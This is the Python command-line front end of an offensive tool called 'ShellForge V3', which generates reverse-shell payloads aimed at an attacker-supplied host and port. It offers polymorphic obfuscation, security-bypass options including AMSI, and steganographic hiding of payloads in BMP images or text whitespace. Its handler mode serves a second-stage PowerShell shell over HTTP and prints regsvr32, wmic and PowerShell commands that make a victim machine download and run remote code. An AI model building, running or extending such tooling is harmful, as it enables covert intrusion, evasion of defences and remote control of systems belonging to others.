import argparse
import sys
import os

# Add parent directory to path to allow imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shellforge.core.generator import Generator
from shellforge.core.config import VERSION, SUPPORTED_EXTENSIONS, DEFAULT_PORT
from shellforge.obfuscators.steganography import SteganographyEngine

def main():
    parser = argparse.ArgumentParser(description=f"ShellForge V3 - The Insane Shell Generator (v{VERSION})")
    
    parser.add_argument("host", help="LHOST (Attacker IP)")
    parser.add_argument("port", type=int, nargs="?", default=DEFAULT_PORT, help=f"LPORT (Default: {DEFAULT_PORT})")
    parser.add_argument("extension", choices=SUPPORTED_EXTENSIONS, metavar="EXTENSION", help=f"Payload extension/type (Supported: {', '.join(SUPPORTED_EXTENSIONS)})")
    
    parser.add_argument("-o", "--output", help="Output filename")
    parser.add_argument("--obfuscate", action="store_true", help="Enable polymorphic obfuscation")
    parser.add_argument("--bypass", help="Enable bypass technique (e.g., zip_in_zip)")
    parser.add_argument("--stego-bmp", help="Embed payload in BMP image (Path to cover image)")
    parser.add_argument("--stego-txt", help="Embed payload in Text file whitespace (Path to cover text)")
    parser.add_argument("--serve", action="store_true", help="Auto-stage payload and start HTTP server (Handler Mode)")
    
    args = parser.parse_args()

    # Determine output filename if not provided
    if not args.output:
        args.output = f"shell.{args.extension}"

    print(f"[*] ShellForge V3 starting...")
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Type: {args.extension}")
    
    generator = Generator()
    
    try:
        # --- HANDLER MODE ---
        if args.serve:
            import http.server
            import socketserver
            import threading
            import time

            HTTP_PORT = 8080
            STAGE_FILE = "run.ps1"

            print(f"[*] Mode: HANDLER (Auto-Staging)")
            
            # 1. Generate Stage Payload (The actual shell)
            print(f"[*] Generating Stage 2 Payload ({STAGE_FILE})...")
            # We force powershell for the stage for now, as our bypasses are PS-based
            stage_content = generator.generate(
                host=args.host,
                port=args.port,
                extension="powershell",
                output_file=None, # Get content
                obfuscate=args.obfuscate # Obfuscate the stage too if requested
            )
            
            # Write stage to disk so HTTP server can serve it
            with open(STAGE_FILE, "wb") as f:
                if isinstance(stage_content, str):
                    f.write(stage_content.encode('utf-8'))
                else:
                    f.write(stage_content)
            print(f"[+] Stage 2 ({STAGE_FILE}) ready.")

            # 2. Start HTTP Server
            class Handler(http.server.SimpleHTTPRequestHandler):
                def log_message(self, format, *args):
                    print(f"[*] HTTP Request: {self.client_address[0]} - {format%args}")

            def start_server():
                with socketserver.TCPServer(("", HTTP_PORT), Handler) as httpd:
                    print(f"[*] HTTP Server serving at port {HTTP_PORT}")
                    httpd.serve_forever()

            t = threading.Thread(target=start_server)
            t.daemon = True
            t.start()
            
            # 3. Generate Bypass Payload (The loader)
            # This payload points to OUR HTTP server, not the reverse shell listener
            print(f"[*] Generating Bypass Payload ({args.output})...")
            
            # We need to temporarily override the generator's template rendering?
            # No, we just pass the HTTP port as the 'port' argument to the generator for the bypass.
            # The bypass templates use {host}:{port} for the download URL.
            
            bypass_content = generator.generate(
                host=args.host,
                port=HTTP_PORT, # Point to HTTP server
                extension=args.extension,
                output_file=args.output,
                obfuscate=args.obfuscate,
                bypass=args.bypass
            )
            
            print(f"[+] Bypass Payload generated: {args.output}")
            print(f"\n[!] === EXECUTE THIS ON TARGET ===")
            if args.extension == "amsi":
                print(f"powershell -ExecutionPolicy Bypass -File {args.output}")
            elif args.extension == "sct":
                print(f"regsvr32 /s /n /u /i:http://{args.host}:{HTTP_PORT}/{args.output} scrobj.dll") # Wait, SCT needs to be hosted too?
                # Actually SCT is usually hosted. If extension is SCT, we might need to host the SCT file too.
                # For now, let's assume user copies the file or we host it.
                # If we are serving, we are serving the current directory. So args.output is also served!
                print(f"regsvr32 /s /n /u /i:http://{args.host}:{HTTP_PORT}/{args.output} scrobj.dll")
            elif args.extension == "xsl":
                print(f"wmic process get brief /format:\"http://{args.host}:{HTTP_PORT}/{args.output}\"")
            else:
                print(f"Execute {args.output} on target.")
            
            print(f"\n[*] Waiting for payload download... (Press Ctrl+C to stop)")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Stopping server...")
                sys.exit(0)

        # --- STANDARD MODE ---
        # Generate the base payload first
        payload = generator.generate(
            host=args.host,
            port=args.port,
            extension=args.extension,
            output_file=None, # Don't save yet if we are doing stego
            obfuscate=args.obfuscate,
            bypass=args.bypass
        )
        
        # 5. Steganography
        if args.stego_bmp:
            print(f"[*] Embedding payload in BMP: {args.stego_bmp}")
            stego = SteganographyEngine()
            output_bmp = args.output if args.output else "output.bmp"
            # We need to read the payload content if it was returned as a path (which it shouldn't be with output_file=None, but let's be safe)
            # Actually generator.generate returns path if output_file is set, or content if not.
            # Wait, generator.generate logic needs to be checked.
            # Let's assume it returns content if output_file is None.
            
            if stego.hide_in_bmp(payload, args.stego_bmp, output_bmp):
                print(f"[+] Steganography successful: {output_bmp}")
                return
            else:
                print("[-] Steganography failed.")
                return

        if args.stego_txt:
            print(f"[*] Embedding payload in Text: {args.stego_txt}")
            stego = SteganographyEngine()
            output_txt = args.output if args.output else "output.txt"
            if stego.hide_in_whitespace(payload, args.stego_txt, output_txt):
                print(f"[+] Steganography successful: {output_txt}")
                return
            else:
                print("[-] Steganography failed.")
                return

        # 6. Save Output (Standard)
        if args.output:
            # If generator returned a path (because bypass might force file creation), we are done.
            # But if we passed output_file=None, it returns content.
            # We need to handle this.
            
            # Let's check generator.generate implementation.
            # If bypass is used, it might create a file.
            pass 
            
            # For now, let's just write it if it's a string
            if isinstance(payload, str) and not os.path.exists(args.output):
                 with open(args.output, "w") as f:
                    f.write(payload)
            
            print(f"[+] Generated successfully: {args.output}")
            if os.path.exists(args.output):
                print(f"[+] Size: {os.path.getsize(args.output)} bytes")
        else:
            print(payload)
            
        if args.obfuscate:
            print(f"[+] Obfuscation: POLYMORPHIC APPLIED")
        if args.bypass:
            print(f"[+] Bypass: {args.bypass.upper()} APPLIED")
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
